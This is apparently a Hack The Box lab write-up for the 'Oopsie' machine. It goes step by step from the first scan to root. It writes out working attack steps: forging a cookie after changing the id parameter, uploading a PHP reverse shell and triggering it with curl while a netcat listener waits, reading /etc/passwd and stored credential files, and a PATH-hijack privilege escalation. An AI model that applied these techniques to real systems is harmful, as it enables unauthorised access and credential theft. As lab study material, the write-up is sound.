# HTB Oopsie Writeup

*29/5/2020*

Use `nmap -sV` to scan ports
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 07:43 EDT
Nmap scan report for 10.10.10.28
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.84 seconds
```
Crawl through/enumerate subdirectories using `skipfish` (We can also use burp suite, but it was extremely slow on my system, need to find out why.) 

Besides the usual stuff (fontawesome, css files), we find an interesting directory: `http://10.10.10.28/cdn-cgi/`

However, we still don't have any idea of what is in `cdn-cgi` contains. 

I tried a different crawler, OWASP's `dirbuster` this time. The wordlists required are in `/usr/share/dirbuster/wordlists`, and I used the `directory-list-2.3-medium.txt` wordlist (directories that were found on at least 2 different hosts). The wordlist is faster than pure bruteforce.

We find an interesting `.../cdn-cgi/login/` directory.

When we navigate there we find a login page. We reuse the password from the previous compromised machine (Architect), `MEGACORP_4dm1n!!`. We try a generic username, `admin`, and we are logged in!

---

We are now in `http://10.10.10.28/cdn-cgi/login/admin.php`.

We see an `Account` tab at the top, and when we click on it we are sent to `http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1`.

We see:
* Access ID: 34322
* Name: admin
* Email: admin@megacorp.com

Notice how the `id=1` is exposed in the URL? We can do Web Parameter tampering here. We change it to `id=4` and we see:

We see:
* Access ID: 8832
* Name: john
* Email: john@tafcz.co.uk

This is a client, as seen from our `Clients` tab.

~~But the question is, what is the access id for? (Tried 3342 as the password for `ssh` (`root@10.10.10.28`) and it fails.)~~

Okay, the access id is actually for the website's cookie, and the website's cookie determines the role (and therefore the privileges) of the user.

The name corresponds to `role` in the cookie, and the access id corresponds to `user` in the cookie.

The uploads page is blocked, requiring 'super admin' rights. We probably need the uploads page if we want a reverse shell.

To find more information and try to obtain super admin rights, we can try to enumerate `id` some more. 

This would be too tiring and slow by hand, so I wrote a script, `bruteForceAdminSelenium.py`, with Python using Selenium to automate the process.

I noticed the Access ID and name fell in a table (the only table on the page), so it was easy to grab data using Selenium's `driver.find_element_by_xpath("//table[1]").text` (find the first table and get the text within it).

At `id=30`, we see:
* Access ID: 86575
* Name: super admin
* Email: superadmin@megacorp.com

Changing my cookie (I used Firefox's `Cookie Quick Manager` extension), and accessing uploads, we find that we can now upload files to the server.

If the server doesn't sanitize files that are uploaded, we can try to get a reverse shell by uploading a payload and calling it. 

First we find our ip using `ifconfig`, looking for `tun0`'s `inet` since we are using openvpn. 

This ip will be `LHOST` for the payload. (You want the target to connect to your ip)

We use `php-reverse-shell.php` (included by default with Kali Linux under `/usr/share/webshells`) to generate a reverse php shell and edit it to use our ip.

We then upload it to the server.

Earlier analysis with `dirbuster` shows there is an `uploads` folder, so we can try to call our uploaded file with that.

First we set up a listener with `nc -lvnp 443` (I used port 443 for the shell)

Then we `curl 10.10.10.28/uploads/php-reverse-shell.php` 

We are in!

Now we need to escalate privileges. First let's get a list of users using `cat /etc/passwd`. We find robert to be an interesting user, so let's go to `/home/robert`. We find a file named `user.txt`, containing the user flag. Let's save it for now.

`su robert` doesn't work because php shell doesn't count as a terminal, so we get the error `su: must be run from a terminal`.

To upgrade the shell, we use 

```bash
SHELL=/bin/bash script -q /dev/null
stty raw -echo
reset
xterm
```
*HackTheBox's walkthrough included some commands that didn't work/caused problems when used, need to find out why*

Let's try to find other information.

The web server is apache, and its files are usually hosted at `/var/www/html/`. From StackOverflow: 

> `/var/www/html` is just the default root folder of the web server. You can change that to be whatever folder you want by editing your `apache.conf` file (usually located in `/etc/apache/conf`) and changing the `DocumentRoot` attribute (see [http://httpd.apache.org/docs/current/mod/core.html#documentroot](http://httpd.apache.org/docs/current/mod/core.html#documentroot) for info on that)

Once there we do `ls -la`, and we find `./cdn-cgi/login`. There we find an interesting file, `db.php`, which we didn't know about before. Inside is:
```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

```

So the host is `localhost`, and the database name is `garage`. 

We can try to connect to the database using `mysql -u robert -p garage` and inputting the password we just found. However, this doesn't give us any new information, only information that we already know from `10.10.10.28`'s admin website.

We can also try to `su` to `robert` with his database password, because he may re-use it. This succeeds!

---
*Below text is from https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html*
### Suid and Guid Misconfiguration

When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.

Let's try this out !
```bash
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

We start with SUID and we find
```
<... Edited out for brevity ...>
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
```

Let's try `bugtracker` because it doesn't seem like a default program. Let's check whether it runs as root first. **If it runs as another user but that user isn't root, then we can't use it to escalate privileges.**

```bash
pushd /usr/bin
ls -la bugtracker
```
Output:
```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 10:14 bugtracker
```
We find that it is indeed running as root.
 	
We want to find out what it is running, so we use `strings bugtracker`.

It calls `cat /root/reports`, however this `cat` is not an absolute path, so we can insert our own `cat` and add it to the path so that that `cat` is executed instead, as root.

To get a shell we need to open `/bin/sh`, and since the `bugtracker` file executes as root, this will create a root shell.

We can't write directly to `/usr/bin` as we don't have the required permissions. Let's write it somewhere inconspicuous, like `/tmp` instead
```bash
# Filename: cat
# Location: /tmp
/bin/sh
```
Now we add `/tmp` to our path.
```bash
export PATH=/tmp:$PATH
```
And we run `bugtracker` again.

We see a familiar `#`, but just to be sure, we run `whoami` and we get `root`.

---
We also find an interesting file in `/root` called `root.txt`, containing the root flag.

We also find a few reports under the `reports` folder.

1:
```
Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
```

2:
```
If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
```
This is a massive hint to check out the `.config` folder, where we find a folder named `filezilla`, and inside of it we find a `filezilla.xml` file

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.44</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

The last report, 3:
```
Hello,

When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...

Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)

I don't have such an issue or any slowdown when using other apps over the same SMB shares.

ProblemType: Bug
DistroRelease: Ubuntu 12.04
Package: filezilla 3.5.3-1ubuntu2
ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
Uname: Linux 3.2.0-25-generic x86_64
NonfreeKernelModules: nvidia
ApportVersion: 2.0.1-0ubuntu8
Architecture: amd64
Date: Sun Jul 1 19:06:31 2012
EcryptfsInUse: Yes
InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
ProcEnviron:
 TERM=xterm
 PATH=(custom, user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
---
ApportVersion: 2.13.3-0ubuntu1
Architecture: amd64
DistroRelease: Ubuntu 14.04
EcryptfsInUse: Yes
InstallationDate: Installed on 2013-02-23 (395 days ago)
InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
Package: gvfs
PackageArchitecture: amd64
ProcEnviron:
 LANGUAGE=fr_FR
 TERM=xterm
 PATH=(custom, no user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
Tags: trusty
Uname: Linux 3.13.0-19-generic x86_64
UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
UserGroups:

```
